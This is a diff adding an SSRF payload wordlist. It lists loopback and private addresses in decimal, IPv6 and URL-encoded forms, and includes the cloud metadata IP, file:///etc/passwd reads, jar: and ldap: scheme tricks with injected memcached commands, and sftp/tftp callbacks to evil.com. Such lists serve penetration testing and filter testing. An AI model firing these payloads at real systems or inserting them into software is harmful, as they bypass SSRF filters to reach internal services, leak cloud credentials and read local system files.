@@ -1,0 +1,43 @@
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+ssrf.php?url=http://127.0.0.1:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+sftp://evil.com:11111/
+tftp://evil.com:12346/TESTUDPPACKET
+ldap://localhost:11211/%0astats%0aquit
+http://brutelogic.com.br/poc.svg
